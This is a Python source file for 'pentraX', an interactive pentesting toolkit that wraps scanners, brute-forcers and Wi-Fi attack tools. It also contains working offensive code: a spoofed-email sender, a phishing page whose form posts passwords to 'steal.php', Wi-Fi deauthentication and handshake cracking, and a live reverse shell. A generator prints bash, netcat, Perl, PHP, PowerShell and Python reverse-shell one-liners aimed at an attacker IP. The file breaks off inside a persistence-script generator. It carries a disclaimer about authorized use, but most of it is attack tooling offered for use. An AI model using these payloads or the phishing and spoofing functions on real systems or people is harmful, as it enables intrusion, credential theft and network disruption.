#!/usr/bin/env python3
# pentraX_wsl.py - Full Pentesting Toolkit (WSL Compatible + Social Engineering)

import subprocess
import socket
import requests
import hashlib
import os
import ssl
import json
import time
import threading
import shutil
from urllib.parse import urlparse
import sys
import re

# Add color output utilities
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def cprint(text, color):
    print(f"{color}{text}{Colors.ENDC}")

def animated_print(text, delay=0.03):
    for line in text.splitlines():
        print(line)
        time.sleep(delay)

def typewriter(text, delay=0.01):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)

class Spinner:
    def __init__(self, message="Working..."):
        self.spinner = ['|', '/', '-', '\\']
        self.idx = 0
        self.running = False
        self.thread = None
        self.message = message
    def start(self):
        self.running = True
        def spin():
            while self.running:
                print(f"\r{self.message} {self.spinner[self.idx % len(self.spinner)]}", end='', flush=True)
                self.idx += 1
                time.sleep(0.1)
        self.thread = threading.Thread(target=spin)
        self.thread.start()
    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join()
        print("\r" + " " * (len(self.message) + 4) + "\r", end='')

def print_menu_with_header(menu_text):
    print(BANNER)
    print(DISCLAIMER)
    print(Colors.OKCYAN + "-"*60 + Colors.ENDC)
    print(color_menu_numbers(menu_text))
    print(Colors.OKCYAN + "-"*60 + Colors.ENDC)

def print_menu_no_clear(menu_text):
    print(BANNER)
    print(DISCLAIMER)
    print(Colors.OKCYAN + "-"*60 + Colors.ENDC)
    print(color_menu_numbers(menu_text))
    print(Colors.OKCYAN + "-"*60 + Colors.ENDC)

# Utility to color menu numbers (e.g., '1.', '2.', etc.) in cyan
import re
def color_menu_numbers(menu_text):
    # Replace numbers at the start of lines (e.g., '1.', '2.') with colored versions
    def repl(match):
        return f"{Colors.OKCYAN}{match.group(0)}{Colors.ENDC}"
    return re.sub(r"^\s*\d+\. ", repl, menu_text, flags=re.MULTILINE)

BANNER = f"""
{Colors.OKCYAN}
██████╗ ███████╗███╗   ██╗████████╗██████╗  █████╗ ██╗  ██╗
██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔══██╗██╔══██╗╚██╗██╔╝
██████╔╝█████╗  ██╔██╗ ██║   ██║   ██████╔╝███████║ ╚███╔╝ 
██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔═══╝ ██╔══██║ ██╔██╗ 
██║     ███████╗██║ ╚████║   ██║   ██║     ██║  ██║██╔╝ ██╗
╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
              FULL PENTEST TOOLKIT (V1.0)

         {Colors.BOLD}Created by astra-incognito{Colors.ENDC}{Colors.OKCYAN}
         GitHub: https://github.com/astra-incognito/
"""

# Add a prominent disclaimer under the logo
DISCLAIMER = f"""
{Colors.WARNING}{Colors.BOLD}DISCLAIMER:{Colors.ENDC}{Colors.WARNING}
This toolkit is for educational and authorized penetration testing use only.
Unauthorized use against systems you do not own or have explicit written permission to test is illegal and unethical.
By using this toolkit, you agree to comply with all applicable laws and regulations.
The author assumes no liability for misuse or damage caused by this software.
{Colors.ENDC}
"""

# Animated logo/banner reveal
animated_print(BANNER, delay=0.03)

# Typewriter effect for disclaimer
print()
typewriter(DISCLAIMER, delay=0.01)

if sys.platform != "linux" and sys.platform != "linux2":
    print("[!] This toolkit is only supported on Linux.")
    sys.exit(1)

def ensure_installed(cmd_name, install_cmd):
    if shutil.which(cmd_name) is None:
        print(f"[!] {cmd_name} not found. Installing...")
        subprocess.run(["sudo", "apt", "install", "-y"] + install_cmd.split())

def check_root():
    if os.geteuid() != 0:
        print("[!] This action requires root privileges. Please run as root or with sudo.")
        return False
    return True

def check_monitor_mode(iface):
    # Simple check for monitor mode
    try:
        output = subprocess.getoutput(f"iwconfig {iface}")
        if "Mode:Monitor" not in output:
            print(f"[!] Interface {iface} is not in monitor mode. Use: sudo airmon-ng start {iface}")
            return False
    except Exception:
        print(f"[!] Could not check monitor mode for {iface}.")
        return False
    return True

def auto_install_dependencies():
    # List of required tools
    tools = [
        ("nmap", "nmap"),
        ("hydra", "hydra"),
        ("sqlmap", "sqlmap"),
        ("gobuster", "gobuster"),
        ("arp-scan", "arp-scan"),
        ("whois", "whois"),
        ("set", "set"),
        ("sendmail", "sendmail"),
        ("dig", "dnsutils"),
        ("aircrack-ng", "aircrack-ng"),
        ("wifite", "wifite"),
        ("reaver", "reaver"),
        ("hcxdumptool", "hcxdumptool"),
        ("hcxpcapngtool", "hcxtools"),
        ("ettercap", "ettercap-text-only"),
        ("wifiphisher", "wifiphisher"),
        ("bettercap", "bettercap"),
    ]
    for cmd, pkg in tools:
        if shutil.which(cmd) is None:
            print(f"[!] {cmd} not found. Installing {pkg}...")
            subprocess.run(["sudo", "apt", "install", "-y", pkg])
    # Download wordlists if missing
    wordlists = {
        "/usr/share/wordlists/rockyou.txt": "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
        "/usr/share/wordlists/dirb/common.txt": "https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt",
        "/usr/share/wordlists/subdomains-top1million-5000.txt": "https://raw.githubusercontent.com/assetnote/commonspeak2-wordlists/master/subdomains/subdomains-top1million-5000.txt"
    }
    for path, url in wordlists.items():
        if not os.path.exists(path):
            print(f"[!] Wordlist not found: {path}. Downloading...")
            os.makedirs(os.path.dirname(path), exist_ok=True)
            try:
                r = requests.get(url)
                with open(path, "wb") as f:
                    f.write(r.content)
                print(f"[+] Downloaded {path}")
            except Exception as e:
                print(f"[-] Failed to download {path}: {e}")

# Logging results
import datetime

def log_result(name, data):
    with open(f"results_{name}.txt", "a") as f:
        f.write(f"[{datetime.datetime.now().isoformat()}] {data}\n")

# ARP Scan
def arp_scan():
    ensure_installed("arp-scan", "arp-scan")
    cprint("[+] Scanning local network for live hosts (requires sudo)...", Colors.OKBLUE)
    try:
        result = subprocess.run(["sudo", "arp-scan", "-l"], capture_output=True, text=True)
        if result.returncode != 0:
            cprint("[-] arp-scan failed. Are you running with sudo?", Colors.FAIL)
            cprint(result.stderr, Colors.FAIL)
            return
        print(result.stdout)
        # Parse live hosts
        hosts = []
        for line in result.stdout.splitlines():
            if line and ":" in line and "." in line.split()[0]:
                hosts.append(line)
        if hosts:
            cprint(f"[+] Found {len(hosts)} live hosts:", Colors.OKGREEN)
            for h in hosts:
                print(h)
            log_result("arp", "\n".join(hosts))
        else:
            cprint("[!] No live hosts found.", Colors.WARNING)
    except Exception as e:
        cprint(f"[-] Error running arp-scan: {e}", Colors.FAIL)

# Nmap Wrapper
def nmap_scan(target):
    ensure_installed("nmap", "nmap")
    def is_valid_ip(ip):
        import re
        return re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", ip) or re.match(r"^[a-zA-Z0-9.-]+$", ip)
    if not is_valid_ip(target):
        print("[-] Invalid target. Enter a valid IP address or hostname.")
        return
    print(f"\n[+] Running Nmap scan on {target}")
    help_text = '''\nNmap Advanced Options Help:
- Service/version:        -sV
- OS detection:           -O
- Stealth SYN scan:       -sS
- UDP scan:               -sU
- Aggressive:             -A
- Top 1000 ports:         --top-ports 1000
- All ports:              -p- 
- NSE scripts:            --script=default,vuln
- Custom script:          --script=/path/to/script.nse
- Output to file:         -oN result.txt
- Timing:                 -T4
- Firewall evasion:       -f, --data-length, --source-port
- Example:                -sS -A -T4 --script=default,vuln -oN scan.txt
'''
    presets = [
        ("1. Quick scan (top 1000 ports)", "--top-ports 1000"),
        ("2. Full TCP scan (all ports)", "-p-"),
        ("3. Service/version detection", "-sV"),
        ("4. OS detection", "-O"),
        ("5. Aggressive scan (OS, version, script, traceroute)", "-A"),
        ("6. Vulnerability scripts", "--script=vuln"),
        ("7. Default scripts", "--script=default"),
        ("8. Custom script", None),
        ("9. Custom options (manual entry)", None),
        ("h. Show help/examples", None),
        ("0. Cancel", None)
    ]
    while True:
        print("\nNmap Scan Presets:")
        for label, _ in presets:
            print(f"  {label}")
        choice = input("Select preset or enter 'h' for help, '9' for custom options: ").strip()
        if choice == "0":
            return
        elif choice == "h":
            print(help_text)
            continue
        elif choice == "1":
            options = "--top-ports 1000"
        elif choice == "2":
            options = "-p-"
        elif choice == "3":
            options = "-sV"
        elif choice == "4":
            options = "-O"
        elif choice == "5":
            options = "-A"
        elif choice == "6":
            options = "--script=vuln"
        elif choice == "7":
            options = "--script=default"
        elif choice == "8":
            script = input("Enter NSE script name or path (e.g. default,vuln or /path/to/script.nse): ").strip()
            options = f"--script={script}"
        elif choice == "9":
            options = input("Enter full Nmap options (e.g. -sS -A -T4 --script=default,vuln): ").strip() or "-A"
        else:
            print("Invalid choice.")
            continue
        break
    spinner = Spinner("Scanning with Nmap")
    spinner.start()
    result = subprocess.run(["nmap"] + options.split() + [target], capture_output=True, text=True)
    spinner.stop()
    print(result.stdout)
    # Highlight open ports
    open_ports = []
    for line in result.stdout.splitlines():
        if "/tcp" in line and "open" in line:
            print(f"[OPEN] {line}")
            open_ports.append(line)
    log_result("nmap", result.stdout)
    if not open_ports:
        print("[!] No open ports found by Nmap.")

# Hydra Wrapper
def hydra_scan(ip, username, service):
    ensure_installed("hydra", "hydra")
    wordlist = input("Hydra wordlist path (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    if os.path.exists(wordlist + ".gz"):
        subprocess.run(["gunzip", wordlist + ".gz"])
    print("\n[+] Brute-force login with Hydra")
    print(f"[+] Target: {ip} | User: {username} | Service: {service}")
    result = subprocess.run(["hydra", "-l", username, "-P", wordlist, f"{ip}", service], capture_output=True, text=True)
    print(result.stdout)
    # Show found passwords
    found = []
    for line in result.stdout.splitlines():
        if "login:" in line and "password:" in line:
            print(f"[FOUND] {line}")
            found.append(line)
    log_result("hydra", result.stdout)
    if not found:
        print("[!] No valid credentials found by Hydra.")

# SQLMap Wrapper
def sqlmap_scan(url):
    ensure_installed("sqlmap", "sqlmap")
    print("\n[+] Testing SQL Injection on target")
    options = input("SQLMap options (default --batch --crawl=1): ").strip() or "--batch --crawl=1"
    result = subprocess.run(["sqlmap", "-u", url] + options.split(), capture_output=True, text=True)
    print(result.stdout)
    # Show found vulnerabilities
    found = []
    for line in result.stdout.splitlines():
        if "is vulnerable" in line or "parameter" in line:
            print(f"[VULN] {line}")
            found.append(line)
    log_result("sqlmap", result.stdout)
    if not found:
        print("[!] No SQLi vulnerabilities found by SQLMap.")

# SEToolkit Wrapper (Social Engineering)
def setoolkit():
    ensure_installed("set", "set")
    print("\n[!] WARNING: Use the Social Engineering Toolkit (SET) only for authorized, ethical testing.")
    print("[!] SET requires sudo/root permissions.")
    print("[+] Launching Social Engineering Toolkit...")
    subprocess.run(["sudo", "setoolkit"])

# Fake Email Sender (Local spoof test only)
def spoof_email():
    import re
    def valid_email(addr):
        return re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", addr)
    sender = input("From (fake): ")
    recipient = input("To (real): ")
    if not valid_email(sender) or not valid_email(recipient):
        print("[-] Invalid email address format.")
        return
    subject = input("Subject: ")
    body = input("Body: ")
    print("\n[!] This will attempt to send mail using your system's sendmail or configured relay.")
    message = f"Subject: {subject}\nFrom: {sender}\nTo: {recipient}\n\n{body}"
    if shutil.which("sendmail") is None:
        print("[-] sendmail not found. Install with: sudo apt install sendmail")
        print("[!] Here is the raw email content. You can try sending it manually:")
        print("\n--- RAW EMAIL ---\n" + message + "\n--- END ---\n")
        return
    try:
        result = subprocess.run(["sendmail", recipient], input=message.encode(), capture_output=True, text=True)
        if result.returncode == 0:
            print("[+] Spoofed email sent.")
            log_result("spoofmail", f"From: {sender} To: {recipient} Subject: {subject}")
        else:
            print(f"[-] sendmail failed: {result.stderr}")
            print("[!] Troubleshooting: Ensure sendmail is configured and your system allows local mail delivery.")
            print("[!] Here is the raw email content. You can try sending it manually:")
            print("\n--- RAW EMAIL ---\n" + message + "\n--- END ---\n")
    except Exception as e:
        print(f"[-] Failed to send email: {e}")
        print("[!] Troubleshooting: Ensure sendmail is installed and configured. Try running 'sudo apt install sendmail'.")
        print("[!] Here is the raw email content. You can try sending it manually:")
        print("\n--- RAW EMAIL ---\n" + message + "\n--- END ---\n")

# Phishing Page Generator (Static HTML)
def phishing_page():
    folder = "phish_page"
    os.makedirs(folder, exist_ok=True)
    print("[!] WARNING: Use phishing pages only for authorized, ethical testing.")
    use_custom = input("Use custom HTML template? (y/N): ").strip().lower() == 'y'
    if use_custom:
        html = input("Paste your custom HTML (end with a single line containing only END):\n")
        lines = []
        while True:
            line = input()
            if line.strip() == "END":
                break
            lines.append(line)
        html = "\n".join(lines)
    else:
        title = input("Page title: ")
        prompt = input("Prompt text (e.g. Enter your password): ")
        html = f"""
        <html><head><title>{title}</title></head>
        <body>
        <h2>{prompt}</h2>
        <form method='POST' action='steal.php'>
            <input name='user' placeholder='Username'><br>
            <input name='pass' type='password' placeholder='Password'><br>
            <input type='submit'>
        </form></body></html>
        """
    with open(os.path.join(folder, "index.html"), "w") as f:
        f.write(html)
    print(f"[+] Phishing page saved to ./{folder}/index.html")

# Port Scan (basic, using socket)
def port_scan(ip):
    try:
        port_range = input("Port range (e.g. 20-1024, default 1-1024): ")
        if '-' in port_range:
            start, end = map(int, port_range.split('-'))
        else:
            start, end = 1, 1024
    except Exception:
        start, end = 1, 1024
    print(f"[+] Scanning ports {start}-{end} on {ip}")
    open_ports = []
    for port in range(start, end+1):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        try:
            s.connect((ip, port))
            banner = ""
            try:
                s.sendall(b'\r\n')
                banner = s.recv(1024).decode(errors='ignore').strip()
            except:
                pass
            print(f"[OPEN] Port {port} {'- ' + banner if banner else ''}")
            open_ports.append(f"{port} {banner}")
            log_result("portscan", f"{ip}:{port} OPEN {banner}")
        except:
            pass
        s.close()
    if not open_ports:
        print("[!] No open ports found in range.")

# Whois Lookup
def whois_lookup(domain):
    ensure_installed("whois", "whois")
    print(f"[+] Whois lookup for {domain}")
    result = subprocess.getoutput(f"whois {domain}")
    print(result)
    # Highlight key fields
    highlights = []
    for line in result.splitlines():
        if any(key in line.lower() for key in ["registrar", "creation date", "expiry", "expiration", "name server", "status", "updated date"]):
            highlights.append(line)
    if highlights:
        print("\n[+] Key Whois Info:")
        for h in highlights:
            print(h)
    log_result("whois", result)

# HTTP Headers Grabber
def headers_grabber(url):
    try:
        follow = input("Follow redirects? (y/N): ").strip().lower() == 'y'
        start = time.time()
        r = requests.get(url, allow_redirects=follow)
        elapsed = time.time() - start
        print(f"[+] Status: {r.status_code} | Time: {elapsed:.2f}s")
        print(f"[+] Headers for {url}:")
        for k, v in r.headers.items():
            print(f"{k}: {v}")
        if r.history:
            print("[!] Redirect chain:")
            for resp in r.history:
                print(f"  {resp.status_code} -> {resp.url}")
        log_result("headers", f"{url}\nStatus: {r.status_code}\nHeaders: {dict(r.headers)}\nTime: {elapsed:.2f}s")
    except Exception as e:
        print(f"[-] Error: {e}")

# Crack SHA256 Hash (simple wordlist attack)
def crack_hash(h):
    wordlist = input("Wordlist path (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    hash_type = input("Hash type (sha256/sha1/md5, default sha256): ").strip().lower() or "sha256"
    if not os.path.exists(wordlist):
        print(f"[-] Wordlist not found: {wordlist}")
        return
    print(f"[+] Cracking {hash_type} hash using {wordlist} ...")
    hash_func = hashlib.sha256
    if hash_type == "md5":
        hash_func = hashlib.md5
    elif hash_type == "sha1":
        hash_func = hashlib.sha1
    found = False
    with open(wordlist, "rb") as f:
        for i, word in enumerate(f, 1):
            word = word.strip()
            if hash_func(word).hexdigest() == h:
                print(f"[+] Hash cracked: {word.decode()}")
                log_result("crackhash", f"{h} = {word.decode()}")
                found = True
                break
            if i % 100000 == 0:
                print(f"  ...{i} words tried...")
    if not found:
        print("[-] Hash not found in wordlist.")

# DNS Lookup
def dns_lookup(domain):
    import subprocess
    print(f"[+] DNS lookup for {domain}")
    records = {}
    for rtype in ["A", "AAAA", "MX", "TXT"]:
        try:
            result = subprocess.getoutput(f"dig +short {domain} {rtype}")
            if result.strip():
                records[rtype] = result.strip().splitlines()
        except Exception as e:
            print(f"[-] Error fetching {rtype} records: {e}")
    if records:
        for rtype, values in records.items():
            print(f"{rtype} records:")
            for v in values:
                print(f"  {v}")
        log_result("dns", f"{domain}: {records}")
    else:
        print("[-] No DNS records found.")

# SSL Certificate Info
def ssl_info(domain):
    ctx = ssl.create_default_context()
    with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
        try:
            s.connect((domain, 443))
            cert = s.getpeercert()
            if not isinstance(cert, dict):
                print("[-] Could not retrieve certificate details.")
                return
            print(f"[+] SSL cert for {domain}:")
            subject = {k: v for t in cert['subject'] for k, v in t} if 'subject' in cert else {}
            issuer = {k: v for t in cert['issuer'] for k, v in t} if 'issuer' in cert else {}
            print(f"  Subject: {subject}")
            print(f"  Issuer: {issuer}")
            exp = cert['notAfter'] if 'notAfter' in cert else None
            print(f"  Expiry: {exp}")
            # Warn if expired or self-signed
            import datetime
            if exp and isinstance(exp, str):
                try:
                    exp_dt = datetime.datetime.strptime(exp, '%b %d %H:%M:%S %Y %Z')
                    if exp_dt < datetime.datetime.utcnow():
                        print("[!] Certificate is EXPIRED!")
                except Exception:
                    pass
            if subject and issuer and subject == issuer:
                print("[!] Certificate is self-signed!")
            log_result("ssl", json.dumps(cert))
        except Exception as e:
            print(f"[-] Error: {e}")

# Subdomain Finder (basic, using wordlist)
def find_subdomains(domain):
    wordlist = input("Subdomain wordlist path (default /usr/share/wordlists/subdomains-top1million-5000.txt): ").strip() or "/usr/share/wordlists/subdomains-top1million-5000.txt"
    if not os.path.exists(wordlist):
        print("[-] Subdomain wordlist not found!")
        return
    print(f"[+] Finding subdomains for {domain}")
    found = []
    with open(wordlist) as f:
        for i, sub in enumerate(f, 1):
            sub = sub.strip()
            subdomain = f"{sub}.{domain}"
            try:
                socket.gethostbyname(subdomain)
                print(f"[FOUND] {subdomain}")
                found.append(subdomain)
            except:
                pass
            if i % 500 == 0:
                print(f"  ...{i} subdomains tested...")
    if found:
        print(f"[+] {len(found)} subdomains found.")
        log_result("subdomains", "\n".join(found))
    else:
        print("[!] No subdomains found.")

# Directory Bruteforce (basic, using wordlist)
def dir_bruteforce(base):
    wordlist = input("Dir wordlist path (default /usr/share/wordlists/dirb/common.txt): ").strip() or "/usr/share/wordlists/dirb/common.txt"
    if not os.path.exists(wordlist):
        print("[-] Dirb wordlist not found!")
        return
    print(f"[+] Bruteforcing directories on {base}")
    found = []
    with open(wordlist) as f:
        for i, line in enumerate(f, 1):
            path = line.strip()
            url = f"{base}/{path}"
            try:
                r = requests.get(url)
                if r.status_code == 200:
                    print(f"[FOUND] {url} [200]")
                    found.append(url)
                else:
                    print(f"[X] {url} [{r.status_code}]")
            except:
                pass
            if i % 100 == 0:
                print(f"  ...{i} paths tested...")
    if found:
        print(f"[+] {len(found)} directories found.")
        log_result("dirbrute", "\n".join(found))
    else:
        print("[!] No directories found.")

# CVE Search (using cve.circl.lu API)
def cve_lookup(keyword):
    try:
        url = f"https://cve.circl.lu/api/search/{keyword}"
        r = requests.get(url)
        data = r.json()
        results = data.get("data", [])
        if not results:
            print("[-] No CVEs found.")
            return
        for item in results[:5]:
            print(f"CVE: {item.get('id')} - {item.get('summary')}")
            print(f"  CVSS: {item.get('cvss')}")
            print(f"  Published: {item.get('Published')}")
            print(f"  References: {item.get('references')[:2]}")
        log_result("cve", json.dumps(results[:5]))
    except Exception as e:
        print(f"[-] Error: {e}")

# Gobuster Dir Scan (wrapper)
def gobuster_scan(target_url):
    ensure_installed("gobuster", "gobuster")
    wordlist = input("Gobuster wordlist path (default /usr/share/wordlists/dirb/common.txt): ").strip() or "/usr/share/wordlists/dirb/common.txt"
    print(f"[+] Running gobuster on {target_url}")
    result = subprocess.run(["gobuster", "dir", "-u", target_url, "-w", wordlist], capture_output=True, text=True)
    found = []
    for line in result.stdout.splitlines():
        if line.startswith("/") and "Status:" in line:
            print(line)
            found.append(line)
    if found:
        print(f"[+] {len(found)} directories found.")
        log_result("gobuster", "\n".join(found))
    else:
        print("[!] No directories found by gobuster.")

def osint_wordlist_generator():
    print("[+] OSINT Wordlist Generator")
    name = input("Target's full name: ").strip()
    nickname = input("Nickname/alias (optional): ").strip()
    company = input("Company/organization (optional): ").strip()
    birth_year = input("Birth year (optional): ").strip()
    keywords = input("Other keywords (comma separated): ").strip().split(",")
    base = []
    if name:
        parts = name.split()
        base.extend(parts)
        base.append(name.replace(" ", ""))
    if nickname:
        base.append(nickname)
    if company:
        base.append(company)
    if birth_year:
        base.append(birth_year)
    base.extend([k.strip() for k in keywords if k.strip()])
    # Generate variations
    wordlist = set()
    for word in base:
        wordlist.add(word)
        wordlist.add(word.lower())
        wordlist.add(word.upper())
        wordlist.add(word.capitalize())
        for suffix in ["123", "!", "2023", "2024", "#", "@", "1", "01"]:
            wordlist.add(word + suffix)
    # Save to file
    fname = input("Save wordlist as (default osint_wordlist.txt): ").strip() or "osint_wordlist.txt"
    with open(fname, "w") as f:
        for w in sorted(wordlist):
            f.write(w + "\n")
    print(f"[+] Wordlist saved to {fname} ({len(wordlist)} entries)")

def wifi_scan():
    print("[+] Scanning for WiFi networks (requires monitor mode and root)...")
    iface = input("Wireless interface (e.g. wlan0): ").strip()
    print("[*] Enabling monitor mode...")
    subprocess.run(["sudo", "airmon-ng", "start", iface])
    mon_iface = iface + "mon" if not iface.endswith("mon") else iface
    print(f"[*] Using monitor interface: {mon_iface}")
    print("[*] Press Ctrl+C to stop scanning.")
    try:
        subprocess.run(["sudo", "airodump-ng", mon_iface])
    except KeyboardInterrupt:
        print("[!] Scan stopped.")
    subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])

def wifi_handshake_capture():
    print("[+] Capture WPA handshake (requires monitor mode and root)...")
    if not check_root():
        print("[-] Root privileges required.")
        return
    iface = input("Wireless interface (e.g. wlan0): ").strip()
    if not check_monitor_mode(iface):
        print(f"[-] {iface} is not in monitor mode. Use: sudo airmon-ng start {iface}")
        return
    if shutil.which("airodump-ng") is None:
        print("[-] airodump-ng not found. Please install aircrack-ng suite.")
        return
    bssid = input("Target BSSID (AP MAC): ").strip()
    channel = input("Channel: ").strip()
    out_file = input("Output file prefix (default: handshake): ").strip() or "handshake"
    mon_iface = iface
    if not iface.endswith("mon"):
        mon_iface = iface + "mon"
        print("[*] Enabling monitor mode...")
        subprocess.run(["sudo", "airmon-ng", "start", iface])
    print(f"[*] Using monitor interface: {mon_iface}")
    print("[*] Capturing handshake. Press Ctrl+C when done.")
    try:
        proc = subprocess.Popen(["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", out_file, mon_iface], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        if proc.stdout is not None:
            for line in proc.stdout:
                print(line, end='')
        proc.wait()
    except KeyboardInterrupt:
        print("[!] Capture stopped.")
    subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
    # Detect the actual .cap file name
    cap_file = f"{out_file}-01.cap"
    if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0:
        print(f"[+] Handshake capture file: {cap_file}")
        # Check for handshake presence
        if shutil.which("aircrack-ng"):
            print("[*] Checking for handshake in capture file...")
            try:
                result = subprocess.run(["aircrack-ng", "-a2", "-w", "/dev/null", cap_file], capture_output=True, text=True)
                print(result.stdout)
                if "1 handshake" in result.stdout or "handshake(s)" in result.stdout:
                    print(f"[+] Handshake(s) detected in {cap_file}!")
                else:
                    print(f"[-] No handshake detected in {cap_file}. Try recapturing or deauthing a client.")
            except Exception as e:
                print(f"[-] Error running aircrack-ng for handshake check: {e}")
        else:
            print("[!] aircrack-ng not found. Cannot check for handshake presence.")
    else:
        print(f"[-] Handshake file {cap_file} not found or empty. Capture may have failed.")
    input("\n[Press Enter to return to the menu]")

def wifi_crack_handshake():
    print("[+] Crack WPA/WPA2 handshake with aircrack-ng or hashcat...")
    if shutil.which("aircrack-ng") is None:
        print("[-] aircrack-ng not found. Please install aircrack-ng.")
        return
    cap_file = input("Handshake .cap file: ").strip()
    if not os.path.exists(cap_file):
        print(f"[-] File {cap_file} not found.")
        return
    wordlist = input("Wordlist path (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    if not os.path.exists(wordlist):
        print(f"[-] Wordlist {wordlist} not found.")
        return
    print("[*] Cracking with aircrack-ng...")
    save = input("Save results to file? (y/N): ").strip().lower() == 'y'
    if save:
        out_file = input("Output file (default: aircrack_result.txt): ").strip() or "aircrack_result.txt"
        with open(out_file, "w") as f:
            try:
                proc = subprocess.Popen(["aircrack-ng", "-w", wordlist, cap_file], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                if proc.stdout is not None:
                    for line in proc.stdout:
                        print(line, end='')
                        f.write(line)
                proc.wait()
                print(f"[+] Results saved to {out_file}")
            except Exception as e:
                print(f"[-] aircrack-ng failed: {e}")
    else:
        try:
            proc = subprocess.Popen(["aircrack-ng", "-w", wordlist, cap_file])
            proc.communicate()
        except Exception as e:
            print(f"[-] aircrack-ng failed: {e}")
    # Optionally, add hashcat support here
    input("\n[Press Enter to return to the menu]")

def wifi_deauth_attack():
    print("[+] Deauthentication attack (requires monitor mode and root)...")
    iface = input("Wireless interface (e.g. wlan0): ").strip()
    bssid = input("Target BSSID (AP MAC): ").strip()
    client = input("Target client MAC (leave blank for broadcast): ").strip()
    print("[*] Enabling monitor mode...")
    subprocess.run(["sudo", "airmon-ng", "start", iface])
    mon_iface = iface + "mon" if not iface.endswith("mon") else iface
    print(f"[*] Using monitor interface: {mon_iface}")
    if client:
        print(f"[*] Sending deauth packets to {client} on {bssid}")
        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client, mon_iface])
    else:
        print(f"[*] Sending broadcast deauth packets on {bssid}")
        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, mon_iface])
    subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])

def wifi_wifite():
    print("[+] Launching Wifite (automated WiFi attack tool)...")
    subprocess.run(["sudo", "wifite"])

def reverse_shell():
    print("[!] WARNING: Use the reverse shell only for authorized, ethical testing.")
    ip = input("Connect back to IP: ").strip()
    port = input("Port: ").strip()
    try:
        port = int(port)
    except ValueError:
        print("[-] Invalid port number.")
        return
    print(f"[+] Launching reverse shell to {ip}:{port} ...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        import pty
        pty.spawn("/bin/bash")
    except Exception as e:
        print(f"[-] Reverse shell failed: {e}")

def generate_reverse_shell_payload():
    print("[!] Generate reverse shell payload for use on a target.")
    ip = input("Attacker IP (your IP): ").strip()
    port = input("Port to connect back to: ").strip()
    try:
        port = int(port)
    except ValueError:
        print("[-] Invalid port number.")
        return
    print("Select payload type:")
    print("1. Python (default)")
    print("2. Bash")
    print("3. Netcat")
    print("4. Perl")
    print("5. PHP")
    print("6. PowerShell (Windows)")
    print("7. Android Bash (rooted/busybox)")
    ptype = input("Payload type [1-7]: ").strip() or "1"
    if ptype == "2":
        payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    elif ptype == "3":
        payload = f"nc -e /bin/bash {ip} {port}"
    elif ptype == "4":
        payload = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'"
    elif ptype == "5":
        payload = f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
    elif ptype == "6":
        payload = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    elif ptype == "7":
        payload = f"/system/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1"
    else:
        payload = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
    print("\n[+] Copy and run this on the target:")
    print(payload)
    save = input("Save as script file? (y/N): ").strip().lower() == 'y'
    if save:
        fname = input("Filename (default: revshell.txt): ").strip() or "revshell.txt"
        with open(fname, "w") as f:
            f.write(payload + "\n")
        print(f"[+] Script saved as {fname}")
    if ptype == "7":
        print("[!] This payload works on rooted Androids with busybox or netcat support.")
        print("[!] You may need to use /system/xbin/busybox sh or /system/xbin/nc depending on the device.")

def generate_persistence_script():
    print("[!] Generate a Linux persistence script for a reverse shell.")
    ip = input("Attacker IP (your IP): ").strip()
    port = input("Port to connect back to: ").strip()
    try:
        port = int(port)
    except ValueError:
